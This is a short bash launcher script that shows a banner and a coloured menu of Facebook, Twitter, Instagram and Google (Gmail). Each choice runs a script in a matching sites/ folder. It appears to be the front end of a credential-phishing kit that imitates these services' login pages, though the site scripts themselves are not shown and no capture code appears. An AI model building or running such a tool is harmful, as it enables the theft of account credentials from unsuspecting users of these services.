#!/usr/bin/bash
#banner area
clear
cat .banner.txt

#option area
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
echo ""
echo ""
menu()
{
    echo -e "${red}[${green}1${red}]${blue}.${yellow}Facebook                     ${red}[${green}3${red}]${blue}.${yellow}Instagram"
    echo -e "${red}[${green}2${red}]${blue}.${yellow}Twitter                      ${red}[${green}4${red}]${blue}.${yellow}Google (gmail)"
    echo ""
    read  -p "Choose site: > " op
    echo -e "${white}"
    if [ $op -eq "1" ];then
        cd sites/Facebook && ./facebook.sh
        exit 1
    elif [ $op -eq "2" ];then
        cd sites/Twitter && ./twitter.sh
        exit 1
    elif [ $op -eq "3" ];then
        cd sites/Instagram && ./instagram.sh
        exit 1 
    elif [ $op -eq "4" ];then
        cd sites/google && ./google.sh
        exit 1 
    else
        echo -e "${red}[-]${blue} Choose correct option!"
    fi

}
menu